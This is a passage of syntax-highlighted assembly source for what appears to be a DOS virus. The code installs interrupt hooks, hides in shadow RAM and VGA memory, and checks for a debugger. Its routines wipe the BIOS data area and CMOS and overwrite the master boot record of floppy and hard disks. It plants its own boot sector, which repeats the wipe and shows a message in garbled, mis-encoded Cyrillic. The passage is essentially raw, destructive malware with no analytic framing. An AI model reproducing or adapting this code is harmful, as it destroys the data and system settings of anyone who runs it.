                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> magic_o
                <span style="color: #00007f; font-weight: bold;">je</span>      __exit
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3306h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      __dos7
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">bl</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">6</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __exit
__dos7<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">mov</span>     dosver<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bl</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1130h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bh</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">15</span>
                <span style="color: #00007f; font-weight: bold;">and</span>     <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0fff0h</span>
                <span style="color: #00007f; font-weight: bold;">shr</span>     <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">4</span>
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bp</span>
                <span style="color: #00007f; font-weight: bold;">sub</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">16</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     shadow_ptr<span style="color: #339933;">.</span>s<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     shadow_ptr<span style="color: #339933;">.</span>o<span style="color: #339933;">,</span> <span style="color: #ff0000;">0100h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3521h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     old21<span style="color: #339933;">.</span>o<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     old21<span style="color: #339933;">.</span>s<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3508h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     old08<span style="color: #339933;">.</span>o<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     old08<span style="color: #339933;">.</span>s<span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">3</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">80h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">81h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0ffh</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">87h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    move_to_shadow
&nbsp;
                <span style="color: #00007f; font-weight: bold;">cmp</span>     dosver<span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">je</span>      __skip1
                <span style="color: #00007f; font-weight: bold;">call</span>    move_to_vga
&nbsp;
                <span style="color: #00007f; font-weight: bold;">les</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> loader_ptr
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> loader
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> loader_size
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
__skip1<span style="color: #339933;">:</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2503h</span>
                <span style="color: #00007f; font-weight: bold;">lds</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>shadow_ptr
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> int03<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2508h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>shadow_ptr<span style="color: #339933;">.</span>s
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> int08
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2521h</span>
                <span style="color: #00007f; font-weight: bold;">lds</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>loader_ptr
                <span style="color: #00007f; font-weight: bold;">cmp</span>     <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>dosver<span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">jne</span>     __skip2
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>shadow_ptr<span style="color: #339933;">.</span>s
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> alt_21
__skip2<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">21h</span>
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">es</span> <span style="color: #46aa03; font-weight: bold;">ds</span>
                <span style="color: #00007f; font-weight: bold;">popa</span>
&nbsp;
                retf
&nbsp;
kill_em<span style="color: #339933;">:</span>        IFDEF   DEBUG
                <span style="color: #00007f; font-weight: bold;">int</span> <span style="color: #ff0000;">3</span>
                ELSE
                <span style="color: #00007f; font-weight: bold;">nop</span>
                ENDIF
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_40
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_cmos
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> mbr
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_mbr
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0eah</span>
                <span style="color: #0000ff; font-weight: bold;">dd</span>      <span style="color: #ff0000;">0f000fff0h</span>
&nbsp;
mbr<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">cli</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ss</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7c00h</span>
                <span style="color: #00007f; font-weight: bold;">sti</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_40
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">bx</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_cmos
&nbsp;
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7c00h</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    kill_mbr
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    pop_msg
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'à ¢Æ‚ ‚•Ø•‡Ï ‚Î, ØÆ£†≠Î© Óß•‡, ¢•·Ï ¢ §•‡Ï¨•.'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'Ä ™‚Æ ‡†ß£‡•°†•‚ §•‡Ï¨Æ? Ñ†, Ì‚Æ Æ≠, ≠†Ë ß†·‚•≠Á®¢Î©, „°Æ£®© §‡„£. ;)))'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'à •¨„ ØÆ ÂÆ§„ Ì‚Æ ≠‡†¢®‚·Ô...'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'åÆ´Á®‚. ë‚ÎÎÎÎÎ§≠Æ. ïÖïÖïÖ.'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'å§††, ®£Æ‡•™. É§• ¶• ¢•°-‚Æ ‚¢Æ©?... † ™†™ ¢·•£§† ;)'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'† ™Æ§ ß†Á•¨ ·Ø®$§®´ ®ß ÄÇè?'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #7f007f;">'Á‚Æ, ·†¨Æ¨„ ·´†°Æ? ùÌÌÂ ‚Î, † Ø®ß$®´-‚Æ, Á‚Æ Æ≠ ™‡„‚Æ©... † Æ≠-£Æ¢#Æ...'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">13</span><span style="color: #339933;">,</span><span style="color: #ff0000;">10</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0</span>
&nbsp;
kill_40<span style="color: #339933;">:</span>        mve     <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">40h</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">di</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">256</span>
                <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">cld</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">stosb</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
kill_cmos<span style="color: #339933;">:</span>      <span style="color: #00007f; font-weight: bold;">xor</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">70h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">71h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     __1
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
kill_mbr<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0000h</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    __1
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">dx</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    __1
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0080h</span>
                <span style="color: #00007f; font-weight: bold;">call</span>    __1
                <span style="color: #00007f; font-weight: bold;">inc</span>     <span style="color: #46aa03; font-weight: bold;">dx</span>
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0301h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0001h</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">13h</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
pop_msg<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">pop</span>     <span style="color: #46aa03; font-weight: bold;">si</span>
                <span style="color: #00007f; font-weight: bold;">cld</span>
&nbsp;
__1<span style="color: #339933;">:</span>            <span style="color: #00007f; font-weight: bold;">lodsb</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0eh</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">7</span>
                <span style="color: #00007f; font-weight: bold;">int</span>     <span style="color: #ff0000;">10h</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jnz</span>     __1
&nbsp;
loader_ptr      <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_loader_ptr
&nbsp;
loader<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">pusha</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ds</span> <span style="color: #46aa03; font-weight: bold;">es</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    port_set
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0eah</span>
video_ptr       <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_video_ptr
&nbsp;
port_set<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">03c4h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0402h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0704h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">03ceh</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0005h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0406h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0204h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
loader_size     <span style="color: #0000ff; font-weight: bold;">equ</span>     <span style="color: #0000ff; font-weight: bold;">$</span><span style="color: #339933;">-</span>loader
&nbsp;
port_reset<span style="color: #339933;">:</span>     <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">03c4h</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0302h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0304h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">03ceh</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">1005h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0e06h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0004h</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #46aa03; font-weight: bold;">dx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span>
                <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">20</span> dup <span style="color: black;">&#40;</span><span style="color: #ff0000;">0f6h</span><span style="color: black;">&#41;</span>
                i       = <span style="color: #0000ff; font-weight: bold;">$</span>
                org     mbr <span style="color: #339933;">+</span> <span style="color: #ff0000;">512</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">2</span>
                <span style="color: #0000ff; font-weight: bold;">dw</span>      <span style="color: #ff0000;">0aa55h</span>
                org     i
&nbsp;
shadow_ptr      <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_shadow_ptr
&nbsp;
invideo<span style="color: #339933;">:</span>        <span style="color: #00007f; font-weight: bold;">call</span>    move_to_shadow
&nbsp;
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>shadow_ptr<span style="color: #339933;">.</span>s
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span>shadow_ptr<span style="color: #339933;">.</span>o
                <span style="color: #00007f; font-weight: bold;">add</span>     <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> inshadow<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">push</span>    <span style="color: #46aa03; font-weight: bold;">ax</span>
                retf
&nbsp;
move_to_vga<span style="color: #339933;">:</span>    <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">81h</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jz</span>      __exit
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">81h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    port_set
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">les</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> video_ptr
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">cld</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">09ah</span>
                <span style="color: #0000ff; font-weight: bold;">dd</span>      cc_video_ptr <span style="color: #339933;">+</span> check_me<span style="color: #339933;">-</span><span style="color: #0000ff; font-weight: bold;">start</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    port_reset
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
check_me<span style="color: #339933;">:</span>       IFDEF  DEBUG
                <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">nop</span>
                <span style="color: #00007f; font-weight: bold;">nop</span>
                ELSE
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0cdh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">03h</span>
                <span style="color: #0000ff; font-weight: bold;">db</span>      <span style="color: #ff0000;">0cch</span>
                ENDIF
                retf
&nbsp;
move_to_shadow<span style="color: #339933;">:</span> <span style="color: #00007f; font-weight: bold;">in</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">80h</span>
                <span style="color: #00007f; font-weight: bold;">or</span>      <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">jz</span>      __exit
                <span style="color: #00007f; font-weight: bold;">dec</span>     <span style="color: #46aa03; font-weight: bold;">al</span>
                <span style="color: #00007f; font-weight: bold;">out</span>     <span style="color: #ff0000;">80h</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">al</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    shadow_open
&nbsp;
                mve     <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">cs</span>
                <span style="color: #00007f; font-weight: bold;">lea</span>     <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">start</span>
                <span style="color: #00007f; font-weight: bold;">les</span>     <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span> shadow_ptr
                <span style="color: #00007f; font-weight: bold;">mov</span>     <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> virsize
                <span style="color: #00007f; font-weight: bold;">cld</span>
                <span style="color: #00007f; font-weight: bold;">rep</span>     <span style="color: #00007f; font-weight: bold;">movsb</span>
&nbsp;
                <span style="color: #00007f; font-weight: bold;">call</span>    shadow_close
&nbsp;
__exit<span style="color: #339933;">:</span>         <span style="color: #00007f; font-weight: bold;">ret</span>
&nbsp;
inshadow<span style="color: #339933;">:</span>       <span style="color: #00007f; font-weight: bold;">call</span>    port_reset
&nbsp;
